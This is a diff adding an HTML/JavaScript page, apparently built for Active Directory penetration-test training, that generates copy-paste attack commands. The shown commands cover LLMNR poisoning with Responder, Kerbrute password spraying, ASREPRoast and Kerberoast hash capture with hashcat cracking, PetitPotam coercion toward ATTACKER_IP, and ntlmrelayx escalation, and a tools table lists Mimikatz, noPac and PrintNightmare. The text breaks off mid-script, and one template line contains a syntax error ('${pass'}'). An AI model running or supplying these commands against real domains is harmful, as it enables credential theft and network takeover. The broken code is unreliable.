@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AD Engagement Workflow</title>
+<style>
+:root {
+  --bg:#050505;--bg2:#0a0a0a;--bg3:#111111;--bg4:#020202;
+  --border:#1a2a1a;--text:#d0d0d0;--text2:#606060;
+  --accent:#00ff41;--accent2:#00cc33;
+  --red:#f85149;--yellow:#e3b341;--green:#3fb950;--orange:#d29922;--purple:#bc8cff;--cyan:#56d4dd;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,monospace;font-size:13px;line-height:1.5;}
+header{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 20px;display:flex;align-items:center;gap:14px;}
+header h1{font-size:18px;color:var(--accent);font-weight:700;letter-spacing:.5px;}
+header .sub{color:var(--text2);font-size:11px;}
+.container{max-width:1400px;margin:0 auto;padding:16px 20px;}
+.section{background:var(--bg2);border:1px solid var(--border);border-radius:7px;margin-bottom:16px;overflow:hidden;}
+.section-header{padding:10px 14px;background:var(--bg3);border-bottom:1px solid var(--border);font-weight:600;font-size:13px;display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none;}
+.section-header:hover{background:#141414;}
+.section-body{padding:14px;}
+.chevron{font-size:10px;color:var(--text2);transition:transform .2s;}
+.chevron.open{transform:rotate(90deg);}
+label{font-size:11px;color:var(--text2);text-transform:uppercase;letter-spacing:.4px;display:block;margin-bottom:4px;}
+input[type=text],textarea,select{
+  width:100%;background:var(--bg3);border:1px solid var(--border);color:var(--text);
+  padding:7px 9px;border-radius:5px;font-size:12px;font-family:monospace;resize:vertical;
+}
+input:focus,textarea:focus,select:focus{outline:none;border-color:var(--accent);}
+button{background:var(--accent2);color:#fff;border:none;padding:6px 14px;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600;transition:background .15s;}
+button:hover{background:var(--accent);}
+button.sec{background:var(--bg3);border:1px solid var(--border);color:var(--text);}
+button.sec:hover{border-color:var(--accent);color:var(--accent);}
+button.danger{background:#3d1a1a;color:var(--red);border:1px solid #6e211e;}
+button.danger:hover{background:var(--red);color:#fff;}
+button.sm{padding:3px 9px;font-size:11px;}
+table{width:100%;border-collapse:collapse;}
+th{text-align:left;padding:7px 10px;font-size:10px;text-transform:uppercase;color:var(--text2);border-bottom:1px solid var(--border);background:var(--bg3);}
+td{padding:6px 10px;border-bottom:1px solid var(--border);font-size:12px;vertical-align:top;}
+tr:hover td{background:var(--bg3);}
+.badge{display:inline-block;padding:1px 7px;border-radius:4px;font-size:10px;font-weight:700;text-transform:uppercase;}
+.badge.pivot{background:#2d1a00;color:var(--orange);border:1px solid #5a3e00;}
+.badge.target{background:#001a00;color:var(--accent);border:1px solid #1a4a1a;}
+.cmd-block{background:var(--bg);border:1px solid var(--border);border-radius:5px;padding:10px;margin-bottom:8px;position:relative;}
+.cmd-block pre{font-size:11px;white-space:pre-wrap;word-break:break-all;color:var(--text);margin:0;padding-right:60px;}
+.copy-btn{position:absolute;top:8px;right:8px;padding:3px 9px;font-size:10px;background:var(--bg3);border:1px solid var(--border);color:var(--text2);border-radius:4px;cursor:pointer;}
+.copy-btn:hover{border-color:var(--accent);color:var(--accent);}
+.phase-nav{display:flex;gap:4px;margin-bottom:14px;flex-wrap:wrap;}
+.phase-btn{padding:5px 14px;border-radius:5px;cursor:pointer;font-size:12px;border:1px solid var(--border);background:var(--bg3);color:var(--text2);}
+.phase-btn.active{border-color:var(--accent);color:var(--accent);background:#001a00;}
+.phase-btn:hover{color:var(--text);}
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;}
+@media(max-width:900px){.grid-2,.grid-3{grid-template-columns:1fr;}}
+.mt8{margin-top:8px;}
+.mt12{margin-top:12px;}
+.flex{display:flex;gap:8px;align-items:center;}
+.flex-between{display:flex;justify-content:space-between;align-items:center;}
+.gap6{gap:6px;}
+textarea.cmd-area{font-size:11px;min-height:60px;}
+.target-row{display:flex;gap:6px;align-items:center;}
+.target-row input{flex:1;}
+.pivot-badge{font-size:9px;background:var(--orange);color:#000;padding:1px 5px;border-radius:3px;font-weight:700;}
+.hidden{display:none;}
+</style>
+</head>
+<body>
+
+<header>
+  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00ff41" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+  <div>
+    <h1>AD Engagement Workflow</h1>
+    <div class="sub">Active Directory attack workflow — targets, pivots, and copy-paste commands</div>
+  </div>
+</header>
+
+<div class="container">
+
+<!-- ═══ TARGETS & PIVOT ═══ -->
+<div class="section" id="targets-section">
+  <div class="section-header" onclick="toggleSection('targets')">
+    <span class="chevron open" id="chevron-targets">▶</span>
+    🎯 Targets & Pivot Host
+  </div>
+  <div class="section-body" id="body-targets">
+
+    <div class="grid-2">
+      <!-- Add Target -->
+      <div>
+        <label>Add Target</label>
+        <div class="target-row">
+          <input type="text" id="targetName" placeholder="Hostname / Description" style="flex:2">
+          <input type="text" id="targetIP" placeholder="IP Address" style="flex:1">
+          <button class="sm" onclick="addTarget()">+ Add</button>
+        </div>
+        <div class="mt8">
+          <label>Current Targets</label>
+          <table>
+            <thead><tr><th>Name</th><th>IP</th><th>Type</th><th>Actions</th></tr></thead>
+            <tbody id="targetTable"><tr><td colspan="4" style="color:var(--text2)">No targets added yet</td></tr></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Pivot Config -->
+      <div>
+        <label>Pivot Host Configuration</label>
+        <div style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:12px;">
+          <div class="grid-2">
+            <div>
+              <label>Pivot Hostname</label>
+              <input type="text" id="pivotName" placeholder="WS01-2019" oninput="renderAll()">
+            </div>
+            <div>
+              <label>Pivot IP (External)</label>
+              <input type="text" id="pivotExtIP" placeholder="10.10.14.5" oninput="renderAll()">
+            </div>
+            <div>
+              <label>Pivot Internal IP</label>
+              <input type="text" id="pivotIntIP" placeholder="172.16.5.10" oninput="renderAll()">
+            </div>
+            <div>
+              <label>Domain</label>
+              <input type="text" id="domain" placeholder="INLANEFREIGHT.LOCAL" oninput="renderAll()">
+            </div>
+          </div>
+          <div class="mt8">
+            <label>Attack Host IP (Your Box)</label>
+            <input type="text" id="attackIP" placeholder="10.10.14.22" oninput="renderAll()">
+          </div>
+          <div class="mt8">
+            <label>Known Credentials (user:pass)</label>
+            <input type="text" id="creds" placeholder="svc_sql:Password123!" oninput="renderAll()">
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══ RECON ═══ -->
+<div class="section">
+  <div class="section-header" onclick="toggleSection('recon')">
+    <span class="chevron" id="chevron-recon">▶</span>
+    🔍 Phase 1 — Reconnaissance
+  </div>
+  <div class="section-body hidden" id="body-recon">
+    <div class="phase-nav">
+      <div class="phase-btn active" onclick="showRecon('enum',this)">Enumeration</div>
+      <div class="phase-btn" onclick="showRecon('poison',this)">LLMNR/NBT-NS Poisoning</div>
+      <div class="phase-btn" onclick="showRecon('ldap',this)">LDAP Enum</div>
+      <div class="phase-btn" onclick="showRecon('smb',this)">SMB Enum</div>
+      <div class="phase-btn" onclick="showRecon('dns',this)">DNS Enum</div>
+    </div>
+    <div id="recon-content"></div>
+  </div>
+</div>
+
+<!-- ═══ INITIAL ACCESS ═══ -->
+<div class="section">
+  <div class="section-header" onclick="toggleSection('initial')">
+    <span class="chevron" id="chevron-initial">▶</span>
+    🚪 Phase 2 — Initial Access
+  </div>
+  <div class="section-body hidden" id="body-initial">
+    <div class="phase-nav">
+      <div class="phase-btn active" onclick="showIA('kerbrute',this)">Kerbrute</div>
+      <div class="phase-btn" onclick="showIA('passspray',this)">Password Spray</div>
+      <div class="phase-btn" onclick="showIA('asreproast',this)">ASREPRoast</div>
+      <div class="phase-btn" onclick="showIA('kerberoast',this)">Kerberoast</div>
+      <div class="phase-btn" onclick="showIA('coerce',this)">Coerce Auth</div>
+    </div>
+    <div id="ia-content"></div>
+  </div>
+</div>
+
+<!-- ═══ LATERAL MOVEMENT ═══ -->
+<div class="section">
+  <div class="section-header" onclick="toggleSection('lateral')">
+    <span class="chevron" id="chevron-lateral">▶</span>
+    ↔️ Phase 3 — Lateral Movement
+  </div>
+  <div class="section-body hidden" id="body-lateral">
+    <div class="phase-nav">
+      <div class="phase-btn active" onclick="showLM('psexec',this)">PsExec</div>
+      <div class="phase-btn" onclick="showLM('wmi',this)">WMI</div>
+      <div class="phase-btn" onclick="showLM('winrm',this)">WinRM</div>
+      <div class="phase-btn" onclick="showLM('pth',this)">Pass-the-Hash</div>
+      <div class="phase-btn" onclick="showLM('ptt',this)">Pass-the-Ticket</div>
+      <div class="phase-btn" onclick="showLM('snaffler',this)">Snaffler</div>
+    </div>
+    <div id="lm-content"></div>
+  </div>
+</div>
+
+<!-- ═══ PRIVILEGE ESCALATION ═══ -->
+<div class="section">
+  <div class="section-header" onclick="toggleSection('privesc')">
+    <span class="chevron" id="chevron-privesc">▶</span>
+    ⬆️ Phase 4 — Privilege Escalation
+  </div>
+  <div class="section-body hidden" id="body-privesc">
+    <div class="phase-nav">
+      <div class="phase-btn active" onclick="showPE('nopac',this)">noPac</div>
+      <div class="phase-btn" onclick="showPE('printnightmare',this)">PrintNightmare</div>
+      <div class="phase-btn" onclick="showPE('laps',this)">LAPS</div>
+      <div class="phase-btn" onclick="showPE('gpp',this)">GPP</div>
+      <div class="phase-btn" onclick="showPE('uac',this)">UAC Bypass</div>
+      <div class="phase-btn" onclick="showPE('token',this)">Token Impersonation</div>
+    </div>
+    <div id="pe-content"></div>
+  </div>
+</div>
+
+<!-- ═══ DOMAIN DOMINANCE ═══ -->
+<div class="section">
+  <div class="section-header" onclick="toggleSection('dominance')">
+    <span class="chevron" id="chevron-dominance">▶</span>
+    👑 Phase 5 — Domain Dominance
+  </div>
+  <div class="section-body hidden" id="body-dominance">
+    <div class="phase-nav">
+      <div class="phase-btn active" onclick="showDD('dcsync',this)">DCSync</div>
+      <div class="phase-btn" onclick="showDD('golden',this)">Golden Ticket</div>
+      <div class="phase-btn" onclick="showDD('silver',this)">Silver Ticket</div>
+      <div class="phase-btn" onclick="showDD('relay',this)">NTLM Relay</div>
+      <div class="phase-btn" onclick="showDD('petit',this)">PetitPotam</div>
+      <div class="phase-btn" onclick="showDD('adcs',this)">ADCS Abuse</div>
+    </div>
+    <div id="dd-content"></div>
+  </div>
+</div>
+
+<!-- ═══ POST-EXPLOITATION ═══ -->
+<div class="section">
+  <div class="section-header" onclick="toggleSection('postex')">
+    <span class="chevron" id="chevron-postex">▶</span>
+    💀 Phase 6 — Post-Exploitation
+  </div>
+  <div class="section-body hidden" id="body-postex">
+    <div class="phase-nav">
+      <div class="phase-btn active" onclick="showPX('bloodhound',this)">BloodHound</div>
+      <div class="phase-btn" onclick="showPX('secretsdump',this)">SecretsDump</div>
+      <div class="phase-btn" onclick="showPX('mimikatz',this)">Mimikatz</div>
+      <div class="phase-btn" onclick="showPX('persistence',this)">Persistence</div>
+      <div class="phase-btn" onclick="showPX('exfil',this)">Exfiltration</div>
+    </div>
+    <div id="px-content"></div>
+  </div>
+</div>
+
+<!-- ═══ TOOLS REFERENCE ═══ -->
+<div class="section">
+  <div class="section-header" onclick="toggleSection('tools')">
+    <span class="chevron" id="chevron-tools">▶</span>
+    🧰 Tools Reference
+  </div>
+  <div class="section-body hidden" id="body-tools">
+    <table>
+      <thead><tr><th>Tool</th><th>Description</th><th>Linux</th><th>Windows</th></tr></thead>
+      <tbody>
+        <tr><td>PowerView / SharpView</td><td>Situational awareness in AD, replaces net* commands</td><td>—</td><td>PowerShell / .NET</td></tr>
+        <tr><td>BloodHound</td><td>Visual AD relationship mapping & attack path planning</td><td>GUI + Neo4j</td><td>GUI + Neo4j</td></tr>
+        <tr><td>SharpHound</td><td>C# data collector for BloodHound</td><td>—</td><td>C#</td></tr>
+        <tr><td>BloodHound.py</td><td>Python BloodHound ingestor (Impacket-based)</td><td>Python</td><td>—</td></tr>
+        <tr><td>Kerbrute</td><td>Kerberos pre-auth enum, password spray, brute-force</td><td>Go binary</td><td>—</td></tr>
+        <tr><td>Impacket</td><td>Python toolkit for network protocol interaction</td><td>Python</td><td>—</td></tr>
+        <tr><td>Responder</td><td>LLMNR / NBT-NS / MDNS poisoning</td><td>Python</td><td>—</td></tr>
+        <tr><td>Inveigh.ps1</td><td>PowerShell network spoofing / poisoning</td><td>—</td><td>PowerShell</td></tr>
+        <tr><td>InveighZero (C#)</td><td>C# Inveigh with semi-interactive console</td><td>—</td><td>C#</td></tr>
+        <tr><td>rpcinfo</td><td>Query RPC services on remote host</td><td>Built-in</td><td>—</td></tr>
+        <tr><td>rpcclient</td><td>AD enumeration via remote RPC</td><td>Samba</td><td>—</td></tr>
+        <tr><td>CrackMapExec</td><td>Enum, attack, post-exploitation (SMB/WMI/WinRM/MSSQL)</td><td>Python</td><td>—</td></tr>
+        <tr><td>Rubeus</td><td>Kerberos abuse toolkit</td><td>—</td><td>C#</td></tr>
+        <tr><td>GetUserSPNs.py</td><td>Find SPNs tied to normal users (Kerberoast)</td><td>Python</td><td>—</td></tr>
+        <tr><td>Hashcat</td><td>Hash cracking & password recovery</td><td>✔</td><td>✔</td></tr>
+        <tr><td>enum4linux</td><td>Enumerate from Windows/Samba</td><td>Perl</td><td>—</td></tr>
+        <tr><td>enum4linux-ng</td><td>Rework of enum4linux</td><td>Python</td><td>—</td></tr>
+        <tr><td>ldapsearch</td><td>LDAP protocol interface</td><td>Built-in</td><td>—</td></tr>
+        <tr><td>windapsearch</td><td>Python LDAP enum for AD users/groups/computers</td><td>Python</td><td>—</td></tr>
+        <tr><td>DomainPasswordSpray</td><td>Password spray against domain users</td><td>—</td><td>PowerShell</td></tr>
+        <tr><td>LAPSToolkit</td><td>Audit/attack LAPS deployments</td><td>—</td><td>PowerShell</td></tr>
+        <tr><td>smbmap</td><td>SMB share enumeration</td><td>Python</td><td>—</td></tr>
+        <tr><td>psexec.py</td><td>PsExec-like semi-interactive shell</td><td>Python</td><td>—</td></tr>
+        <tr><td>wmiexec.py</td><td>Command execution over WMI</td><td>Python</td><td>—</td></tr>
+        <tr><td>Snaffler</td><td>Find creds in AD file shares</td><td>—</td><td>C#</td></tr>
+        <tr><td>smbserver.py</td><td>Simple SMB server for file transfers</td><td>Python</td><td>—</td></tr>
+        <tr><td>setspn.exe</td><td>Read/modify SPN directory property</td><td>—</td><td>Built-in</td></tr>
+        <tr><td>Mimikatz</td><td>PtH, plaintext extraction, Kerberos ticket extraction</td><td>—</td><td>C#</td></tr>
+        <tr><td>secretsdump.py</td><td>Remotely dump SAM and LSA secrets</td><td>Python</td><td>—</td></tr>
+        <tr><td>evil-winrm</td><td>Interactive shell over WinRM</td><td>Ruby</td><td>—</td></tr>
+        <tr><td>mssqlclient.py</td><td>Interact with MSSQL databases</td><td>Python</td><td>—</td></tr>
+        <tr><td>noPac.py</td><td>CVE-2021-42278 + CVE-2021-42287 DA impersonation</td><td>Python</td><td>—</td></tr>
+        <tr><td>rpcdump.py</td><td>RPC endpoint mapper</td><td>Python</td><td>—</td></tr>
+        <tr><td>CVE-2021-1675.py</td><td>PrintNightmare PoC</td><td>Python</td><td>—</td></tr>
+        <tr><td>ntlmrelayx.py</td><td>SMB relay attacks</td><td>Python</td><td>—</td></tr>
+        <tr><td>PetitPotam.py</td><td>CVE-2021-36942 coerce auth via MS-EFSRPC</td><td>Python</td><td>—</td></tr>
+        <tr><td>gettgtpkinit.py</td><td>Manipulate certificates and TGTs</td><td>Python</td><td>—</td></tr>
+        <tr><td>getnthash.py</td><td>Request PAC using U2U</td><td>Python</td><td>—</td></tr>
+        <tr><td>adidnsdump</td><td>Enumerate/dump AD DNS records</td><td>Python</td><td>—</td></tr>
+        <tr><td>gpp-decrypt</td><td>Extract creds from Group Policy Preferences</td><td>Ruby</td><td>—</td></tr>
+        <tr><td>GetNPUsers.py</td><td>ASREPRoasting — get AS-REP hashes</td><td>Python</td><td>—</td></tr>
+        <tr><td>lookupsid.py</td><td>SID bruteforcing</td><td>Python</td><td>—</td></tr>
+        <tr><td>ticketer.py</td><td>Create/customize TGT/TGS tickets</td><td>Python</td><td>—</td></tr>
+        <tr><td>raiseChild.py</td><td>Automated child→parent domain privesc</td><td>Python</td><td>—</td></tr>
+        <tr><td>AD Explorer</td><td>AD viewer/editor, snapshot for offline analysis</td><td>—</td><td>GUI</td></tr>
+        <tr><td>PingCastle</td><td>AD security audit & risk assessment</td><td>—</td><td>GUI</td></tr>
+        <tr><td>Group3r</td><td>Audit AD GPO misconfigurations</td><td>—</td><td>C#</td></tr>
+        <tr><td>ADRecon</td><td>Extract AD data to Excel with summary views</td><td>—</td><td>PowerShell</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+</div><!-- /container -->
+
+<script>
+// ── State ──
+let targets = [];
+let pivot = { name:'', extIP:'', intIP:'' };
+let config = { domain:'', attackIP:'', creds:'' };
+
+// ── Helpers ──
+function esc(s) { return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+function v(id) { return document.getElementById(id).value.trim(); }
+function setVal(id, val) { document.getElementById(id).value = val; }
+
+function copyCmd(btn, text) {
+  const txt = typeof text === 'string' ? text : String(text);
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(txt).then(() => {
+      btn.textContent = '✓ Copied';
+      setTimeout(() => btn.textContent = '⧉ Copy', 1500);
+    });
+  } else {
+    const ta = document.createElement('textarea');
+    ta.value = txt;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    btn.textContent = '✓ Copied';
+    setTimeout(() => btn.textContent = '⧉ Copy', 1500);
+  }
+}
+
+function toggleSection(id) {
+  const body = document.getElementById('body-'+id);
+  const chev = document.getElementById('chevron-'+id);
+  body.classList.toggle('hidden');
+  chev.classList.toggle('open');
+}
+
+// ── Targets ──
+function addTarget() {
+  const name = v('targetName');
+  const ip = v('targetIP');
+  if (!name && !ip) return;
+  targets.push({ name: name||ip, ip: ip||'TBD' });
+  setVal('targetName',''); setVal('targetIP','');
+  renderTargets();
+  renderAll();
+}
+
+function removeTarget(i) {
+  targets.splice(i, 1);
+  renderTargets();
+  renderAll();
+}
+
+function setPivot(i) {
+  const t = targets[i];
+  pivot = { name: t.name, extIP: t.ip, intIP: t.ip };
+  setVal('pivotName', t.name);
+  setVal('pivotExtIP', t.ip);
+  setVal('pivotIntIP', t.ip);
+  renderTargets();
+  renderAll();
+}
+
+function renderTargets() {
+  const tbody = document.getElementById('targetTable');
+  if (!targets.length) {
+    tbody.innerHTML = '<tr><td colspan="4" style="color:var(--text2)">No targets added yet</td></tr>';
+    return;
+  }
+  tbody.innerHTML = targets.map((t,i) => {
+    const isPivot = pivot.name === t.name && pivot.extIP === t.ip;
+    return `<tr>
+      <td>${esc(t.name)}</td>
+      <td>${esc(t.ip)}</td>
+      <td><span class="badge ${isPivot?'pivot':'target'}">${isPivot?'PIVOT':'TARGET'}</span></td>
+      <td>
+        <button class="sm sec" onclick="setPivot(${i})">Set Pivot</button>
+        <button class="sm danger" onclick="removeTarget(${i})">✕</button>
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+// ── Config sync ──
+function syncConfig() {
+  pivot.name = v('pivotName') || pivot.name;
+  pivot.extIP = v('pivotExtIP') || pivot.extIP;
+  pivot.intIP = v('pivotIntIP') || pivot.intIP;
+  config.domain = v('domain');
+  config.attackIP = v('attackIP');
+  config.creds = v('creds');
+}
+
+function renderAll() {
+  syncConfig();
+  // Re-render current phase content if visible
+  // (simplified: just let user re-click)
+}
+
+// ── Command builder ──
+function cmdBlock(label, cmd, note) {
+  const escCmd = esc(cmd);
+  return `<div class="cmd-block">
+    <button class="copy-btn" onclick="copyCmd(this, ${JSON.stringify(cmd)})">⧉ Copy</button>
+    ${label ? `<div style="font-size:10px;color:var(--text2);text-transform:uppercase;margin-bottom:4px;">${esc(label)}</div>` : ''}
+    <pre>${escCmd}</pre>
+    ${note ? `<div style="font-size:10px;color:var(--text2);margin-top:4px;">${esc(note)}</div>` : ''}
+  </div>`;
+}
+
+function multiCmdBlock(label, cmds) {
+  return `<div class="cmd-block">
+    <div style="font-size:10px;color:var(--text2);text-transform:uppercase;margin-bottom:4px;">${esc(label)}</div>
+    ${cmds.map(c => {
+      const noteHtml = c.note ? `<div style="font-size:10px;color:var(--text2);margin-top:2px;">${esc(c.note)}</div>` : '';
+      return `<pre style="margin-bottom:6px;">${esc(c.cmd)}</pre>${noteHtml}`;
+    }).join('')}
+  </div>`;
+}
+
+// ── Phase content renderers ──
+function showRecon(sub, el) {
+  document.querySelectorAll('#body-recon .phase-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  renderRecon(sub);
+}
+
+function renderRecon(sub) {
+  const c = document.getElementById('recon-content');
+  const d = config.domain, p = pivot, a = config.attackIP, creds = config.creds;
+  const user = creds ? creds.split(':')[0] : 'USER';
+  const pass = creds ? creds.split(':')[1] : 'PASS';
+
+  let html = '';
+  if (sub === 'enum') {
+    html = `
+      ${cmdBlock('Nmap quick scan (all targets)', `nmap -sC -sV -T4 ${targets.map(t=>t.ip).join(' ')} -oA nmap/initial`)}
+      ${cmdBlock('Nmap full port scan', `nmap -p- -T4 --min-rate=1000 ${targets.map(t=>t.ip).join(' ')} -oA nmap/full`)}
+      ${cmdBlock('Nmap UDP top 100', `nmap -sU --top-ports 100 -T4 ${targets.map(t=>t.ip).join(' ')} -oA nmap/udp`)}
+      ${cmdBlock('enum4linux all targets', targets.map(t => `enum4linux -a ${t.ip}`).join('\n'), 'Run against each target for quick SMB/user shares info')}
+      ${cmdBlock('enum4linux-ng (JSON output)', `enum4linux-ng -A ${targets.map(t=>t.ip).join(' ')} -oA enum4linux`)}
+      ${cmdBlock('rpcclient null session', targets.map(t => `rpcclient -U "" -N ${t.ip}\n# Then: srvinfo, enumdomusers, getdompwinfo, querydominfo`).join('\n'))}
+      ${cmdBlock('rpcinfo', `rpcinfo -p ${p.intIP || 'TARGET_IP'}`)}
+    `;
+  } else if (sub === 'poison') {
+    html = `
+      ${cmdBlock('Responder (listen only)', `sudo responder -I tun0 -A`, 'Analyze mode — see what broadcasts without poisoning')}
+      ${cmdBlock('Responder (full poison)', `sudo responder -I tun0 -wrfv`, 'LLMNR/NBT-NS/MDNS poisoning with wpad, force WPAD, verbose')}
+      ${cmdBlock('Inveigh (PowerShell — run on pivot)', `Import-Module .\\Inveigh.ps1\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -mDNS Y`)}
+      ${cmdBlock('InveighZero (C# — run on pivot)', `.\\InveighZero.exe`, 'Semi-interactive console, captures hashes in real-time')}
+    `;
+  } else if (sub === 'ldap') {
+    html = `
+      ${cmdBlock('ldapsearch anonymous bind', `ldapsearch -x -H ldap://${p.intIP || 'DC_IP'} -s base namingContexts`)}
+      ${cmdBlock('ldapsearch domain dump', `ldapsearch -x -H ldap://${p.intIP || 'DC_IP'} -D '${user}' -w '${pass}' -b "DC=${d?d.replace(/\./g,',DC='):''}" "(objectClass=user)" sAMAccountName memberOf`)}
+      ${cmdBlock('windapsearch (users)', `python3 windapsearch.py -d ${d} --dc-ip ${p.intIP || 'DC_IP'} -U`)}
+      ${cmdBlock('windapsearch (groups)', `python3 windapsearch.py -d ${d} --dc-ip ${p.intIP || 'DC_IP'} -G`)}
+      ${cmdBlock('windapsearch (computers)', `python3 windapsearch.py -d ${d} --dc-ip ${p.intIP || 'DC_IP'} -C`)}
+      ${cmdBlock('windapsearch (privileged users)', `python3 windapsearch.py -d ${d} --dc-ip ${p.intIP || 'DC_IP'} --da`)}
+      ${cmdBlock('windapsearch (unconstrained delegation)', `python3 windapsearch.py -d ${d} --dc-ip ${p.intIP || 'DC_IP'} -PU`)}
+    `;
+  } else if (sub === 'smb') {
+    html = `
+      ${cmdBlock('smbmap (null)', `smbmap -H ${targets.map(t=>t.ip).join(' ')} -u '' -p ''`)}
+      ${cmdBlock('smbmap (with creds)', `smbmap -H ${targets.map(t=>t.ip).join(' ')} -u '${user}' -w '${pass}'`)}
+      ${cmdBlock('smbclient list shares', targets.map(t => `smbclient -L //${t.ip}/ -U '${user}%${pass}'`).join('\n'))}
+      ${cmdBlock('CrackMapExec SMB enum', `crackmapexec smb ${targets.map(t=>t.ip).join(' ')} -u '${user}' -p '${pass}' --shares`)}
+      ${cmdBlock('CrackMapExec users', `crackmapexec smb ${targets.map(t=>t.ip).join(' ')} -u '${user}' -p '${pass'} --users`)}
+      ${cmdBlock('CrackMapExec groups', `crackmapexec smb ${targets.map(t=>t.ip).join(' ')} -u '${user}' -p '${pass}' --groups`)}
+      ${cmdBlock('CrackMapExec loggedon users', `crackmapexec smb ${targets.map(t=>t.ip).join(' ')} -u '${user}' -p '${pass}' --loggedon-users`)}
+    `;
+  } else if (sub === 'dns') {
+    html = `
+      ${cmdBlock('DNS zone transfer attempt', `dig axfr @${p.intIP || 'DC_IP'} ${d}`)}
+      ${cmdBlock('DNS enum with host', targets.map(t => `host -t ns ${d} ${t.ip}\nhost -t mx ${d} ${t.ip}\nhost -t txt ${d} ${t.ip}`).join('\n'))}
+      ${cmdBlock('adidnsdump', `adidnsdump -u ${d}\\\\${user} --dns-tcp ${p.intIP || 'DC_IP'}`, 'Dumps DNS records from the domain — like a zone transfer')}
+    `;
+  }
+  c.innerHTML = html;
+}
+
+function showIA(sub, el) {
+  document.querySelectorAll('#body-initial .phase-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  renderIA(sub);
+}
+
+function renderIA(sub) {
+  const c = document.getElementById('ia-content');
+  const d = config.domain, p = pivot, creds = config.creds;
+  const user = creds ? creds.split(':')[0] : 'USER';
+  const pass = creds ? creds.split(':')[1] : 'PASS';
+
+  let html = '';
+  if (sub === 'kerbrute') {
+    html = `
+      ${cmdBlock('Kerbrute userenum', `kerbrute userenum -d ${d} --dc ${p.intIP || 'DC_IP'} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`)}
+      ${cmdBlock('Kerbrute password spray', `kerbrute passwordspray -d ${d} --dc ${p.intIP || 'DC_IP'} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 'Welcome1'`)}
+      ${cmdBlock('Kerbrute brute-force (single user)', `kerbrute bruteuser -d ${d} --dc ${p.intIP || 'DC_IP'} /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt ${user}`)}
+    `;
+  } else if (sub === 'passspray') {
+    html = `
+      ${cmdBlock('DomainPasswordSpray (PowerShell — run on pivot)', `Import-Module .\\DomainPasswordSpray.ps1\nInvoke-DomainPasswordSpray -Password 'Welcome1' -OutFile spray_results.txt`)}
+      ${cmdBlock('Kerbrute passwordspray', `kerbrute passwordspray -d ${d} --dc ${p.intIP || 'DC_IP'} users.txt 'Password123!'`, 'Always use a user list — not a password list — to avoid lockouts')}
+      ${cmdBlock('CrackMapExec password spray', `crackmapexec smb ${p.intIP || 'DC_IP'} -u users.txt -p 'Welcome1' --continue-on-success`)}
+    `;
+  } else if (sub === 'asreproast') {
+    html = `
+      ${cmdBlock('GetNPUsers.py (list AS-REP roastable users)', `GetNPUsers.py ${d}/ -dc-ip ${p.intIP || 'DC_IP'} -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt`)}
+      ${cmdBlock('GetNPUsers.py (no creds — enumerate)', `GetNPUsers.py ${d}/ -dc-ip ${p.intIP || 'DC_IP'} -no-pass -usersfile users.txt`)}
+      ${cmdBlock('Crack with Hashcat', `hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force`)}
+    `;
+  } else if (sub === 'kerberoast') {
+    html = `
+      ${cmdBlock('GetUserSPNs.py (Kerberoast)', `GetUserSPNs.py ${d}/${user}:${pass} -dc-ip ${p.intIP || 'DC_IP'} -request -outputfile kerberoast_hashes.txt`)}
+      ${cmdBlock('GetUserSPNs.py (with ticket — from Linux)', `getTGT.py ${d}/${user}:${pass}\nexport KRB5CCNAME=${user}.ccache\nGetUserSPNs.py ${d}/${user} -k -no-pass -dc-ip ${p.intIP || 'DC_IP'} -request`)}
+      ${cmdBlock('Crack with Hashcat', `hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force`)}
+    `;
+  } else if (sub === 'coerce') {
+    html = `
+      ${cmdBlock('PetitPotam (coerce auth via MS-EFSRPC)', `PetitPotam.py -u '${user}' -p '${pass}' -d ${d} ${a || 'ATTACKER_IP'} ${p.intIP || 'TARGET_IP'}`)}
+      ${cmdBlock('PetitPotam (with hashes)', `PetitPotam.py -u '${user}' -hashes :${'NTHASH'} -d ${d} ${a || 'ATTACKER_IP'} ${p.intIP || 'TARGET_IP'}`)}
+      ${cmdBlock('ntlmrelayx (capture the coerced auth)', `ntlmrelayx.py -t ldap://${p.intIP || 'DC_IP'} --escalate-user ${user} -smb2support`, 'Run this BEFORE triggering PetitPotam')}
+      ${cmdBlock('CrackMapExec coerce', `crackmapexec smb ${targets.map(t=>t.ip).join(' ')} -u '${user}' -p '${pass}' --shares --coerce`, 'Built-in coerce options in newer CME versions')}
+    `;
+  }
+  c.innerHTML = html;
+}
+
+function showLM(sub, el) {
+  document.querySelectorAll('#body-lateral .phase-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
